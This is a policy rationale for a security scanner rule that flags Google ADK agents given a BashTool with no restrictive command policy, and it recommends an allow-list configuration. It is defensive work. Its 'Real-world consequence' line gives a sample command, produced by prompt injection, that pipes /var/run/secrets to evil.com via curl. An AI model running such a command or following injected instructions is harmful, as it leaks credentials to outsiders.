---
policy_id: google_adk_builtin_tools
category: google_adk
topic: builtin_tools
rules:
  - id: ADK-008
    severity: high
    confidence: 0.75
    scope: agent
    fix_type: config
references: [LLM06]
---

# Policy Rationale: Built-in Tool Safety Configuration

**Policy ID:** `google_adk_builtin_tools`  
**File:** `google_adk/builtin_tools.yaml`  
**Rules:** ADK-008  
**Severities:** high  
**Fix types:** config  
**References:** LLM06

---

## What this policy covers

Unsafe-by-default configuration on Google ADK built-in tool classes — specifically
an `LlmAgent` that grants `BashTool` with no explicit `policy=`. The match is
`agent_uses_hosted_tool_class: [BashTool]` AND `not
agent_hosted_tool_kwarg_present(class: BashTool, kwarg: policy)`.

---

## Why built-in tool configuration is a distinct concern in agent tools

ADK's built-in tools ship with permissive defaults, and `BashTool` is the sharpest
example. Its `BashToolPolicy` defaults to `allowed_command_prefixes=("*",)` — every
command — and `blocked_operators=()` — no shell metacharacters blocked. So an
`LlmAgent` that simply lists `BashTool()` in its tools, without constructing a
restrictive `policy=`, hands the model a fully-injectable shell: any command, with
pipes, redirects, and `;`/`&&` chaining unfiltered.

This is excessive agency (OWASP LLM06) delivered through a default rather than an
obvious dangerous call. The author did not write `subprocess.run(cmd, shell=True)` —
they wrote `BashTool()`, which looks innocuous but is equivalent. Because the gate
is a constructor argument (`policy=`), the rule checks for its presence; the fix is
*config* — set a restrictive policy on the tool, no tool-body code involved.

(Earlier google-adk exposed a `block_shell_metacharacters` kwarg; current ADK gates
this through `BashToolPolicy`, which is what this rule looks for.)

---

## Rule-by-rule defense

### ADK-008 — Agent grants BashTool with no restrictive command policy (Severity: high, Confidence: 0.75, Fix type: config)

**What we detect:** an `LlmAgent` whose tools include `BashTool` with no `policy=`
kwarg set on it.

**Why it is flaggable:** without `policy=`, `BashTool` defaults to every command and
no operator filtering — model-supplied input reaches the shell with no allow-list.

**Real-world consequence:** an agent with a bare `BashTool()` is prompt-injected into
running `cat /var/run/secrets/* | curl -d @- evil.com`; nothing in the default policy
blocks the chaining or the command.

**Why severity is high and not medium:** the default configuration is fully
injectable shell access — maximal agency with no gate. Not critical because
exploitation still requires the model to be driven to a harmful command.

**Fix type — config:** construct `BashTool(policy=BashToolPolicy(allowed_command_prefixes=..., blocked_operators=...))`
and pair with a `before_tool_callback` (ADK-102) — a wiring change, not tool code.

**Confidence 0.75:** the agent may enforce command safety entirely through a
`before_tool_callback` instead of `policy=`, which this presence check does not see —
the main false positive, hence 0.75.

---

## What this policy does not cover

- A `BashTool` made safe by a `before_tool_callback` rather than `policy=` (a
  legitimate alternative the presence check reads as unguarded — false positive).
- Whether a `policy=` that *is* set is actually restrictive — a `policy` with
  `allowed_command_prefixes=("*",)` satisfies the rule yet allows everything.
- Other built-in tools with permissive defaults beyond `BashTool`.
- `policy=` supplied via a variable the scanner cannot resolve to a constructor.

---

## Recommendations beyond the fix

```python
from google.adk.tools import BashTool, BashToolPolicy
from google.adk.agents import LlmAgent

bash = BashTool(policy=BashToolPolicy(
    allowed_command_prefixes=("git status", "ls", "cat "),
    blocked_operators=(";", "&&", "||", "|", ">", "<", "`", "$("),
))

agent = LlmAgent(
    name="repo_inspector",
    description="Read-only repo inspection via a restricted shell.",
    tools=[bash],
    before_tool_callback=validate_bash_call,   # ADK-102: second gate
)
```

1. Set a restrictive `BashToolPolicy`: allow-list the specific command prefixes the
   agent needs and block shell metacharacters/operators.
2. Add a `before_tool_callback` as a second gate that inspects the assembled command
   before execution (ADK-102) — defense in depth over the static policy.
3. Prefer a typed tool over a shell where possible; reserve `BashTool` for cases that
   genuinely require command execution, and never grant it to a delegated sub-agent
   (ADK-103).
